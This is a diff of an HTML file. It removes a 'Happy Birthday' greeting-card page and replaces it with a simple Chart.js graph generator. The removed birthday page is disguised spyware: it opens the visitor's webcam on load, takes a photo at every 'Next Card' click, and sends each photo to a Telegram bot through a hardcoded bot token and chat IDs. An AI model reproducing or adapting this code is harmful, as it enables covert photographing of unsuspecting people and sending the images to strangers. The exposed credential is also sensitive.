@@ -1,240 +1,255 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Happy Birthday Surprise!</title>
-    <style>
-        /* CSS Styling */
-        body {
-            background-color: #fce4ec;
-            color: #5d4037;
-            font-family: 'Comic Sans MS', cursive, sans-serif;
-            text-align: center;
-            margin: 0;
-            padding: 0;
-            overflow: hidden;
-        }
-        .container {
-            padding: 20px;
-        }
-        h1 {
-            font-size: 3em;
-            margin-bottom: 10px;
-        }
-        h2 {
-            font-size: 2em;
-            margin-bottom: 30px;
-        }
-        .card, .collage {
-            display: none;
-            background-color: #fff3e0;
-            border: 2px solid #5d4037;
-            border-radius: 10px;
-            padding: 20px;
-            margin: 20px auto;
-            max-width: 300px;
-            position: relative;
-        }
-        .card img {
-            width: 100%;
-            height: auto;
-            border-radius: 10px;
-            margin-top: 15px;
-        }
-        #camera {
-            display: none;
-        }
-        .next-card-button {
-            padding: 15px;
-            font-size: 1em;
-            color: #fff;
-            background-color: #5d4037;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: background-color 0.3s;
-            margin: 10px;
-        }
-        .next-card-button:hover {
-            background-color: #8d6e63;
-        }
-        /* Collage Styling */
-        .collage img {
-            width: 70px;
-            height: 70px;
-            margin: 5px;
-            border-radius: 5px;
-            object-fit: cover;
-        }
-        /* Balloon Styling */
-        .balloon {
-            position: absolute;
-            bottom: -50px;
-            width: 40px;
-            height: 60px;
-            background-color: #ff6f61;
-            border-radius: 50%;
-            box-shadow: inset -2px -4px 10px rgba(0, 0, 0, 0.2);
-            animation: floatUp 4s ease-in infinite;
-        }
-        @keyframes floatUp {
-            0% { transform: translateY(0); opacity: 1; }
-            100% { transform: translateY(-100vh); opacity: 0; }
-        }
-        /* Sparkle Styling */
-        .sparkle {
-            position: absolute;
-            width: 10px;
-            height: 10px;
-            background-color: #ffd700;
-            border-radius: 50%;
-            opacity: 0;
-            animation: sparkle 0.6s ease-out forwards;
-        }
-        @keyframes sparkle {
-            0% { transform: scale(0); opacity: 1; }
-            100% { transform: scale(1.5); opacity: 0; }
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Graph Generator</title>
+  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin: 20px;
+    }
+    .input-box {
+      margin: 10px 0;
+    }
+    .options {
+      margin: 15px 0;
+    }
+    .canvas-container {
+      margin-top: 30px;
+    }
+    .graph-box {
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      padding: 15px;
+      margin: 20px auto;
+      width: 80%;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+    }
+    h3 {
+      text-align: center;
+    }
+    canvas {
+      display: block;
+      margin: 10px auto;
+    }
+    .download-btn {
+      margin-top: 10px;
+      padding: 10px 15px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .download-btn:hover {
+      background-color: #45a049;
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🎉 Happy Birthday, Dear! 🎉</h1>
+  <h1>Graph Generator</h1>
 
-        <!-- Camera feed for capturing photos -->
-        <video id="camera" autoplay playsinline></video>
+  <div class="input-box">
+    <label for="xValues">X-Axis Values (comma-separated):</label><br>
+    <input type="text" id="xValues" placeholder="e.g., 1,2,3,4">
+    <br>
+    <label for="xLabel">X-Axis Label:</label><br>
+    <input type="text" id="xLabel" placeholder="X">
+  </div>
 
-        <!-- Cards with Wishes and Captured Photos -->
-        <div class="card" id="card1"><h2>1. Wishing you a day as sweet as chocolate! 🍫</h2><img src="" id="cardImage1"></div>
-        <div class="card" id="card2"><h2>2. May you be surrounded by love and laughter! 🥳</h2><img src="" id="cardImage2"></div>
-        <div class="card" id="card3"><h2>3. Here’s to endless joy and teddy bear hugs! 🧸</h2><img src="" id="cardImage3"></div>
-        <div class="card" id="card4"><h2>4. May all your dreams take flight! ✨</h2><img src="" id="cardImage4"></div>
-        <div class="card" id="card5"><h2>5. Sending you a year filled with sunshine! 🌞</h2><img src="" id="cardImage5"></div>
-        <div class="card" id="card6"><h2>6. May every wish of yours come true! 🌈</h2><img src="" id="cardImage6"></div>
-        <div class="card" id="card7"><h2>7. Cheers to more laughter and happy memories! 🎉</h2><img src="" id="cardImage7"></div>
-        <div class="card" id="card8"><h2>8. You deserve all the love in the world! ❤️</h2><img src="" id="cardImage8"></div>
-        <div class="card" id="card9"><h2>9. May today be as special as you are! 💖</h2><img src="" id="cardImage9"></div>
-        <div class="card" id="card10"><h2>10. To more sweet moments and beautiful days! 🌹</h2><img src="" id="cardImage10"></div>
-        <div class="card" id="card11"><h2>11. May laughter and joy fill your heart! 🥰</h2><img src="" id="cardImage11"></div>
-        <div class="card" id="card12"><h2>12. Here’s to a life of dreams come true! 💫</h2><img src="" id="cardImage12"></div>
-        <div class="card" id="card13"><h2>13. Hoping your day is as magical as you! 🌠</h2><img src="" id="cardImage13"></div>
-        <div class="card" id="card14"><h2>14. May this year bring you new adventures! 🏞️</h2><img src="" id="cardImage14"></div>
-        <div class="card" id="card15"><h2>15. May you be showered with endless blessings! 🌺</h2><img src="" id="cardImage15"></div>
-        <div class="card" id="card16"><h2>16. Here’s to health, happiness, and love! 💖</h2><img src="" id="cardImage16"></div>
-        <div class="card" id="card17"><h2>17. May you shine brighter every day! 🌟</h2><img src="" id="cardImage17"></div>
-        <div class="card" id="card18"><h2>18. Wishing you joy beyond measure! 🎂</h2><img src="" id="cardImage18"></div>
-        <div class="card" id="card19"><h2>19. May love and happiness follow you always! 💞</h2><img src="" id="cardImage19"></div>
-        <div class="card" id="card20"><h2>20. May all your dreams come true! 🌠</h2><img src="" id="cardImage20"></div>
+  <div class="input-box">
+    <label for="yValues">Y-Axis Values (comma-separated):</label><br>
+    <input type="text" id="yValues" placeholder="e.g., 5,10,15,20">
+    <br>
+    <label for="yLabel">Y-Axis Label:</label><br>
+    <input type="text" id="yLabel" placeholder="Y">
+  </div>
 
-        <!-- Collage Display -->
-        <div class="collage" id="collage">
-            <h2>Your Birthday Memories! 🎂</h2>
-            <h2>Created with lot of love by Aradhy💕</h2>
-            <div id="collagePhotos"></div>
-        </div>
+  <div class="options">
+    <h3>Select Graph Options:</h3>
+    <label>
+      <input type="checkbox" id="normalGraph" checked> Normal Graph
+    </label><br>
+    <label>
+      <input type="checkbox" id="curveLines"> Curve Lines
+    </label><br>
+    <label>
+      <input type="checkbox" id="bestFit"> Best Fit Line
+    </label>
+  </div>
 
-        <!-- Next Card Button -->
-        <button class="next-card-button" onclick="nextCard()">Next Card</button>
+  <button onclick="generateGraphs()">Submit</button>
+
+  <div class="canvas-container">
+    <div id="normalGraphBox" class="graph-box" style="display: none;">
+      <h3>Normal Graph</h3>
+      <canvas id="normalGraphCanvas" width="600" height="400"></canvas>
+      <button class="download-btn" onclick="downloadImage('normalGraphCanvas')">Download Image</button>
     </div>
 
-    <script>
-        const botToken = "7854999145:AAFZfhFo_EhVgomg6i9U57s9c105a0YQQSI";
-        const chatId = ["5375898767","7258927081"];
-        let currentCardIndex = 1;
-        const totalCards = 20;
-        const capturedPhotos = [];
+    <div id="curveGraphBox" class="graph-box" style="display: none;">
+      <h3>Curve Lines</h3>
+      <canvas id="curveGraphCanvas" width="600" height="400"></canvas>
+      <button class="download-btn" onclick="downloadImage('curveGraphCanvas')">Download Image</button>
+    </div>
 
-        const video = document.getElementById('camera');
-        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then((stream) => video.srcObject = stream)
-                .catch(error => alert("Camera access error"));
-        }
+    <div id="bestFitBox" class="graph-box" style="display: none;">
+      <h3>Best Fit Line</h3>
+      <canvas id="bestFitCanvas" width="600" height="400"></canvas>
+      <button class="download-btn" onclick="downloadImage('bestFitCanvas')">Download Image</button>
+    </div>
+  </div>
 
-        function nextCard() {
-            capturePhoto();
-            const imageDataUrl = document.getElementById(`cardImage${currentCardIndex}`).src;
-            sendPhotoToTelegram(imageDataUrl);
+  <script>
+    let normalGraphChart, curveGraphChart, bestFitChart;
 
-            document.getElementById(`card${currentCardIndex}`).style.display = 'none';
-            currentCardIndex++;
+    function generateGraphs() {
+      // Get input values
+      const xValues = document.getElementById("xValues").value.split(',').map(Number);
+      const yValues = document.getElementById("yValues").value.split(',').map(Number);
+      const xLabel = document.getElementById("xLabel").value || 'X';
+      const yLabel = document.getElementById("yLabel").value || 'Y';
 
-            if (currentCardIndex <= totalCards) {
-                document.getElementById(`card${currentCardIndex}`).style.display = 'block';
-                createBalloons();
-                createSparkles();
-            } else {
-                showCollage();
+      // Check selected options
+      const normalGraphChecked = document.getElementById("normalGraph").checked;
+      const curveLinesChecked = document.getElementById("curveLines").checked;
+      const bestFitChecked = document.getElementById("bestFit").checked;
+
+      // Validation
+      if (xValues.length !== yValues.length) {
+        alert("X and Y values must have the same number of elements.");
+        return;
+      }
+
+      // Destroy existing charts if they exist
+      if (normalGraphChart) normalGraphChart.destroy();
+      if (curveGraphChart) curveGraphChart.destroy();
+      if (bestFitChart) bestFitChart.destroy();
+
+      // Normal Graph
+      if (normalGraphChecked) {
+        const ctx = document.getElementById("normalGraphCanvas").getContext("2d");
+        document.getElementById("normalGraphBox").style.display = "block";
+        normalGraphChart = new Chart(ctx, {
+          type: 'line',
+          data: {
+            labels: xValues,
+            datasets: [{
+              label: 'Normal Graph',
+              data: yValues,
+              borderColor: 'blue',
+              backgroundColor: 'rgba(0, 0, 255, 0.1)',
+              borderWidth: 2,
+              fill: false,
+              tension: 0, // No curve
+            }]
+          },
+          options: {
+            responsive: true,
+            scales: {
+              x: { title: { display: true, text: xLabel } },
+              y: { title: { display: true, text: yLabel } }
             }
-        }
+          }
+        });
+      } else {
+        document.getElementById("normalGraphBox").style.display = "none";
+      }
 
-        function capturePhoto() {
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const imageDataUrl = canvas.toDataURL('image/png');
-            document.getElementById(`cardImage${currentCardIndex}`).src = imageDataUrl;
-            capturedPhotos.push(imageDataUrl);
-        }
-
-        function sendPhotoToTelegram(imageDataUrl) {
-            fetch(imageDataUrl)
-                .then(res => res.blob())
-                .then(blob => {
-                    const formData = new FormData();
-                    formData.append('chat_id', chatId);
-                    formData.append('photo', blob, 'birthday_photo.png');
-
-                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    })
-                    .then(response => response.json())
-                    .then(data => console.log(data))
-                    .catch(error => console.error(error));
-                });
-        }
-
-        function showCollage() {
-            document.getElementById('collage').style.display = 'block';
-            const collagePhotosDiv = document.getElementById('collagePhotos');
-
-            capturedPhotos.forEach(photo => {
-                const img = document.createElement('img');
-                img.src = photo;
-                collagePhotosDiv.appendChild(img);
-            });
-
-            document.querySelector('.next-card-button').style.display = 'none';
-        }
-
-        function createBalloons() {
-            const colors = ['#ff6f61', '#ffd54f', '#4fc3f7', '#a5d6a7', '#ce93d8'];
-            for (let i = 0; i < 5; i++) {
-                const balloon = document.createElement('div');
-                balloon.classList.add('balloon');
-                balloon.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
-                balloon.style.left = `${Math.random() * 100}vw`;
-                document.body.appendChild(balloon);
-                balloon.addEventListener('animationend', () => balloon.remove());
+      // Curve Lines Graph
+      if (curveLinesChecked) {
+        const ctx = document.getElementById("curveGraphCanvas").getContext("2d");
+        document.getElementById("curveGraphBox").style.display = "block";
+        curveGraphChart = new Chart(ctx, {
+          type: 'line',
+          data: {
+            labels: xValues,
+            datasets: [{
+              label: 'Curve Lines',
+              data: yValues,
+              borderColor: 'green',
+              backgroundColor: 'rgba(0, 255, 0, 0.1)',
+              borderWidth: 2,
+              fill: false,
+              tension: 0.4, // Smooth curve
+            }]
+          },
+          options: {
+            responsive: true,
+            scales: {
+              x: { title: { display: true, text: xLabel } },
+              y: { title: { display: true, text: yLabel } }
             }
-        }
+          }
+        });
+      } else {
+        document.getElementById("curveGraphBox").style.display = "none";
+      }
 
-        function createSparkles() {
-            for (let i = 0; i < 10; i++) {
-                const sparkle = document.createElement('div');
-                sparkle.classList.add('sparkle');
-                sparkle.style.left = `${Math.random() * 100}vw`;
-                sparkle.style.top = `${Math.random() * 100}vh`;
-                document.body.appendChild(sparkle);
-                sparkle.addEventListener('animationend', () => sparkle.remove());
+      // Best Fit Line Graph
+      if (bestFitChecked) {
+        const { slope, intercept } = calculateBestFitLine(xValues, yValues);
+        const bestFitData = xValues.map(x => slope * x + intercept);
+        const ctx = document.getElementById("bestFitCanvas").getContext("2d");
+        document.getElementById("bestFitBox").style.display = "block";
+        bestFitChart = new Chart(ctx, {
+          type: 'scatter',
+          data: {
+            datasets: [{
+              label: 'Data Points',
+              data: xValues.map((x, i) => ({ x, y: yValues[i] })),
+              backgroundColor: 'blue',
+              borderColor: 'blue',
+              borderWidth: 2,
+              showLine: false,
+              pointRadius: 5,
+            }, {
+              label: 'Best Fit Line',
+              data: xValues.map((x, i) => ({ x, y: bestFitData[i] })),
+              backgroundColor: 'red',
+              borderColor: 'red',
+              borderWidth: 2,
+              showLine: true,
+              fill: false,
+            }]
+          },
+          options: {
+            responsive: true,
+            scales: {
+              x: { title: { display: true, text: xLabel } },
+              y: { title: { display: true, text: yLabel } }
             }
-        }
+          }
+        });
+      } else {
+        document.getElementById("bestFitBox").style.display = "none";
+      }
+    }
 
-        document.getElementById(`card${currentCardIndex}`).style.display = 'block';
-    </script>
+    function downloadImage(canvasId) {
+      const canvas = document.getElementById(canvasId);
+      const link = document.createElement('a');
+      link.href = canvas.toDataURL('image/png');
+      link.download = canvasId + '.png';
+      link.click();
+    }
+
+    function calculateBestFitLine(xValues, yValues) {
+      const n = xValues.length;
+      const sumX = xValues.reduce((a, b) => a + b, 0);
+      const sumY = yValues.reduce((a, b) => a + b, 0);
+      const sumXY = xValues.map((x, i) => x * yValues[i]).reduce((a, b) => a + b, 0);
+      const sumX2 = xValues.map(x => x * x).reduce((a, b) => a + b, 0);
+
+      // Calculate slope (m) and intercept (b)
+      const slope = (n * sumXY - sumX * sumY) / (n * sumX2 - sumX * sumX);
+      const intercept = (sumY - slope * sumX) / n;
+
+      return { slope, intercept };
+    }
+  </script>
 </body>
 </html>
